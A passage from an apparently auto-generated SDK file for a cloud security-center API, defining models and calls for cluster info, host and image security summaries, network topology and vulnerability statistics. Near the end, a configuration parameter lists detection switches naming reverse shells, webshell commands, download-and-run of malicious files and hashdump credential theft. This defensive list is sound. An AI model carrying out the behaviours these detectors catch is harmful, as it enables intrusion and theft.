 */
async function describeCloudVendorTrialConfig(request: DescribeCloudVendorTrialConfigRequest): DescribeCloudVendorTrialConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudVendorTrialConfigWithOptions(request, runtime);
}

model DescribeClusterBasicInfoRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.

This parameter is required.', example='c870ec78ecbcb41d2a35c679823ef****'),
  targetType?: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster

This parameter is required.', example='Cluster'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network topology
*   **interceptionSwitch**: cluster microsegmentation

This parameter is required.', example='containerNetwork'),
}

model DescribeClusterBasicInfoResponseBody = {
  clusterInfo?: {
    clusterId?: string(name='ClusterId', description='The ID of cluster.', example='c870ec78ecbcb41d2a35c679823ef****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='testackpro'),
    clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated ASK cluster', example='kubernetes'),
    createTime?: long(name='CreateTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1662038134000'),
    currentVersion?: string(name='CurrentVersion', description='The version of the cluster.', example='1.22.10-aliyun.1'),
    instanceCount?: int32(name='InstanceCount', description='The number of instances in the cluster.', example='10'),
    regionId?: string(name='RegionId', description='The ID of the region in which the cluster is deployed.', example='cn-hangzhou'),
    state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**
*   **Available**
*   **Creating**
*   **CreateFailed**', example='Available'),
    targetResult?: boolean(name='TargetResult', description='Indicates whether the cluster is enabled. Valid values:

*   **true**: The cluster is enabled.
*   **false**: The cluster is disabled.', example='true'),
  }(name='ClusterInfo', description='The detailed information about the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeClusterBasicInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterBasicInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about an cluster based on the cluster ID.
 *
 * @param request DescribeClusterBasicInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterBasicInfoResponse
 */
async function describeClusterBasicInfoWithOptions(request: DescribeClusterBasicInfoRequest, runtime: Util.RuntimeOptions): DescribeClusterBasicInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterBasicInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about an cluster based on the cluster ID.
 *
 * @param request DescribeClusterBasicInfoRequest
 * @return DescribeClusterBasicInfoResponse
 */
async function describeClusterBasicInfo(request: DescribeClusterBasicInfoRequest): DescribeClusterBasicInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterBasicInfoWithOptions(request, runtime);
}

model DescribeClusterHostSecuritySummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c3aaf6c8085f84791882eef200cd2****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query containers. Valid values:

*   **instanceId**: the instance ID
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the region ID
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image repository
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query containers.', example='c1fdb5fd8d42e425d88fd73eec7be****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='222.71.XXX.XXX'),
  targetType?: string(name='TargetType', description='The type of the query. Valid values:

*   **containerId**
*   **uuid**', example='uuid'),
}

model DescribeClusterHostSecuritySummaryResponseBody = {
  clusterHostEvent?: {
    alarmEvent?: [ 
      {
        count?: long(name='Count', description='The number of alerts.', example='1'),
        riskLevel?: string(name='RiskLevel', description='The alert level. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='remind'),
      }
    ](name='AlarmEvent', description='The alert details of the host.'),
    baselineEvent?: [ 
      {
        count?: long(name='Count', description='The number of baselines.', example='1'),
        riskLevel?: string(name='RiskLevel', description='The risk level of the baseline. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='BaselineEvent', description='The baseline details of the host.'),
    vulEvent?: [ 
      {
        count?: long(name='Count', description='The number of vulnerabilities.', example='3'),
        riskLevel?: string(name='RiskLevel', description='The risk level of the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **nntf**: medium. You can fix the vulnerability based on your business requirements.
*   **later**: low. You can ignore the vulnerability.', example='later'),
      }
    ](name='VulEvent', description='The vulnerability details of the host.'),
  }(name='ClusterHostEvent', description='The alert details of the hosts.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeClusterHostSecuritySummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterHostSecuritySummaryResponseBody(name='body'),
}

/**
 * @summary Queries the statistical information about host security.
 *
 * @param request DescribeClusterHostSecuritySummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterHostSecuritySummaryResponse
 */
async function describeClusterHostSecuritySummaryWithOptions(request: DescribeClusterHostSecuritySummaryRequest, runtime: Util.RuntimeOptions): DescribeClusterHostSecuritySummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterHostSecuritySummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistical information about host security.
 *
 * @param request DescribeClusterHostSecuritySummaryRequest
 * @return DescribeClusterHostSecuritySummaryResponse
 */
async function describeClusterHostSecuritySummary(request: DescribeClusterHostSecuritySummaryRequest): DescribeClusterHostSecuritySummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterHostSecuritySummaryWithOptions(request, runtime);
}

model DescribeClusterImageSecuritySummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c3aaf6c8085f84791882eef200cd2****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query containers. Valid values:

*   **instanceId**: the instance ID of the container
*   **clusterId**: the ID of the cluster
*   **regionId**: the region ID of the container
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image repository
*   **imageDigest**: the digest of the image
*   **clusterType**: the type of the cluster
*   **hostIp**: the public IP address
*   **pod**: the pod
*   **podIp**: the IP address of the pod
*   **containerId**: the ID of the container
*   **vulStatus**: whether vulnerabilities are detected on the container
*   **alarmStatus**: whether alerts are generated for the container
*   **riskStatus**: whether risks are detected on the container
*   **riskLevel**: the risk level of the container
*   **containerScope**: the type of the container', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query containers.', example='c2ac28b2d0c734df29a21d29f18ac****'),
  imageDigest?: string(name='ImageDigest', description='The digest of the image.', example='402902de6480a020b9f29e7105e77b8a218bc1cccbc3935d3b38c8ea9ba2****'),
  imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='repo'),
  imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace of the image repository.', example='namespace'),
  imageTag?: string(name='ImageTag', description='The tag of the image.', example='3.54.0.1'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='60.190.XXX.XXX'),
}

model DescribeClusterImageSecuritySummaryResponseBody = {
  clusterImageEvent?: {
    imageBaseline?: [ 
      {
        count?: long(name='Count', description='The number of baselines.', example='0'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='ImageBaseline', description='The information about image baseline risks.'),
    imageCveVul?: [ 
      {
        count?: long(name='Count', description='The number of vulnerabilities.', example='0'),
        riskLevel?: string(name='RiskLevel', description='The alert level. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **nntf**: medium. You can fix the vulnerability based on your business requirements.
*   **later**: low. You can ignore the vulnerability.', example='later'),
      }
    ](name='ImageCveVul', description='The information about image system vulnerabilities.'),
    imageMaliciousFile?: [ 
      {
        count?: long(name='Count', description='The number of malicious samples.', example='0'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='ImageMaliciousFile', description='The information about malicious image samples.'),
    imageScaVul?: [ 
      {
        count?: long(name='Count', description='The number of image application vulnerabilities.', example='0'),
        riskLevel?: string(name='RiskLevel', description='The alert level. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **nntf**: medium. You can fix the vulnerability based on your business requirements.
*   **later**: low. You can ignore the vulnerability.', example='later'),
      }
    ](name='ImageScaVul', description='The information about image application vulnerabilities.'),
  }(name='ClusterImageEvent', description='The information about the image-related security events.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model DescribeClusterImageSecuritySummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterImageSecuritySummaryResponseBody(name='body'),
}

/**
 * @summary Queries the statistical information about image security.
 *
 * @param request DescribeClusterImageSecuritySummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterImageSecuritySummaryResponse
 */
async function describeClusterImageSecuritySummaryWithOptions(request: DescribeClusterImageSecuritySummaryRequest, runtime: Util.RuntimeOptions): DescribeClusterImageSecuritySummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageRepoName)) {
    query['ImageRepoName'] = request.imageRepoName;
  }
  if (!Util.isUnset(request.imageRepoNamespace)) {
    query['ImageRepoNamespace'] = request.imageRepoNamespace;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterImageSecuritySummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistical information about image security.
 *
 * @param request DescribeClusterImageSecuritySummaryRequest
 * @return DescribeClusterImageSecuritySummaryResponse
 */
async function describeClusterImageSecuritySummary(request: DescribeClusterImageSecuritySummaryRequest): DescribeClusterImageSecuritySummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterImageSecuritySummaryWithOptions(request, runtime);
}

model DescribeClusterInfoListRequest {
  target?: string(name='Target', description='The operation value. The value specifies the ID of the cluster.', example='c23551de6149343e8a54e69fbefe6****'),
  targetType?: string(name='TargetType', description='The dimension based on which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster

This parameter is required.', example='Cluster'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network
*   **interceptionSwitch**: cluster microsegmentation

This parameter is required.', example='containerNetwork'),
}

model DescribeClusterInfoListResponseBody = {
  clusterList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='test111'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster.
*   **NotManagedKubernetes**: non-managed Kubernetes cluster.
*   **PrivateKubernetes**: private cluster.
*   **kubernetes**: dedicated Kubernetes cluster.
*   **ask**: dedicated serverless Kubernetes (ASK) cluster.', example='ManagedKubernetes'),
      regionId?: string(name='RegionId', description='The region in which the cluster resides.', example='cn-hangzhou'),
      state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**: The cluster is unavailable.
*   **Available**: The cluster is available.
*   **Creating**: The cluster is being created.
*   **CreateFailed**: The cluster failed to be created.', example='Available'),
      targetResult?: boolean(name='TargetResult', description='Indicates whether container network topology was enabled. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='ClusterList', description='An array that consists of the information about clusters.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeClusterInfoListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterInfoListResponseBody(name='body'),
}

/**
 * @summary Queries the information about a cluster.
 *
 * @param request DescribeClusterInfoListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterInfoListResponse
 */
async function describeClusterInfoListWithOptions(request: DescribeClusterInfoListRequest, runtime: Util.RuntimeOptions): DescribeClusterInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a cluster.
 *
 * @param request DescribeClusterInfoListRequest
 * @return DescribeClusterInfoListResponse
 */
async function describeClusterInfoList(request: DescribeClusterInfoListRequest): DescribeClusterInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterInfoListWithOptions(request, runtime);
}

model DescribeClusterNetworkRequest {
  endTime?: long(name='EndTime', description='The end timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.

This parameter is required.', example='1656038940435'),
  startTime?: long(name='StartTime', description='The start timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.

This parameter is required.', example='1656038740435'),
}

model DescribeClusterNetworkResponseBody = {
  clusterNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', description='The ID of the destination node.', example='cfb41a869c71e4678a97021582dd8****'),
        dstNodeType?: string(name='DstNodeType', description='The type of the destination node. Valid values:

*   Set the value to **cluster**.', example='cluster'),
        id?: string(name='Id', description='The ID of the topology edge.', example='1'),
        port?: string(name='Port', description='The port number of the topology edge.', example='6164'),
        srcNodeId?: string(name='SrcNodeId', description='The ID of the source node.', example='cfb41a869c71e4678a97021582dd8****'),
        srcNodeType?: string(name='SrcNodeType', description='The type of the source node. Valid values:

*   **cluster**: a cluster.
*   **internet**: a network node outside the cluster', example='cluster'),
      }
    ](name='Edge', description='An array that consists of information about the topology edge.'),
    node?: [ 
      {
        cnnfSwitch?: int32(name='CnnfSwitch', description='The status of the microsegmentation switch. Valid values:

*   **0**: off.
*   **1**: on.', example='1'),
        id?: string(name='Id', description='The ID of the node.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
        interceptionType?: int32(name='InterceptionType', description='The network type. Valid values:

*   **0**: classic network.
*   **1**: virtual private cloud (VPC).', example='1'),
        name?: string(name='Name', description='The name of the node.', example='testwww'),
        netTopoSwitch?: string(name='NetTopoSwitch', description='The status of the network topology switch. Valid values:

*   **ON**
*   **OFF**', example='ON'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **3**: high.
*   **2**: medium.
*   **1**: low.
*   **0**: secure.
*   **-1**: unknown.', example='3'),
        type?: string(name='Type', description='The type of the node. Valid values:

*   **cluster**: a cluster.
*   **internet**: a network node outside the cluster.', example='cluster'),
      }
    ](name='Node', description='An array that consists of information about the node.'),
  }(name='ClusterNetwork', description='Information about the network topology edge in the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model DescribeClusterNetworkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterNetworkResponseBody(name='body'),
}

/**
 * @summary Queries information about the network topology edge by cluster.
 *
 * @param request DescribeClusterNetworkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterNetworkResponse
 */
async function describeClusterNetworkWithOptions(request: DescribeClusterNetworkRequest, runtime: Util.RuntimeOptions): DescribeClusterNetworkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the network topology edge by cluster.
 *
 * @param request DescribeClusterNetworkRequest
 * @return DescribeClusterNetworkResponse
 */
async function describeClusterNetwork(request: DescribeClusterNetworkRequest): DescribeClusterNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterNetworkWithOptions(request, runtime);
}

model DescribeClusterVulStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c471f0f61b9c04f8380556e922cf1****'),
  types?: string(name='Types', description='The type of the vulnerabilities. Valid values:

*   **cve**: Linux software vulnerabilities
*   **app**: application vulnerabilities
*   **sca**: vulnerabilities that are detected based on software component analysis', example='cve,app,sca'),
}

model DescribeClusterVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  vulStat?: {
    asapCount?: string(name='AsapCount', description='The number of high-risk vulnerabilities.', example='13'),
    laterCount?: string(name='LaterCount', description='The number of medium-risk vulnerabilities.', example='21'),
    nntfCount?: string(name='NntfCount', description='The number of low-risk vulnerabilities.', example='0'),
  }(name='VulStat', description='The statistics of the vulnerabilities.'),
}

model DescribeClusterVulStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClusterVulStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of vulnerabilities that are detected on a cluster.
 *
 * @param request DescribeClusterVulStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClusterVulStatisticsResponse
 */
async function describeClusterVulStatisticsWithOptions(request: DescribeClusterVulStatisticsRequest, runtime: Util.RuntimeOptions): DescribeClusterVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of vulnerabilities that are detected on a cluster.
 *
 * @param request DescribeClusterVulStatisticsRequest
 * @return DescribeClusterVulStatisticsResponse
 */
async function describeClusterVulStatistics(request: DescribeClusterVulStatisticsRequest): DescribeClusterVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterVulStatisticsWithOptions(request, runtime);
}

model DescribeCommonOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.61.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE_64025**: Ingress service execute command [enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE_63725**: Ingress service implants suspicious script/binary file

This parameter is required.', example='kdump_switch'),
}

model DescribeCommonOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk orders
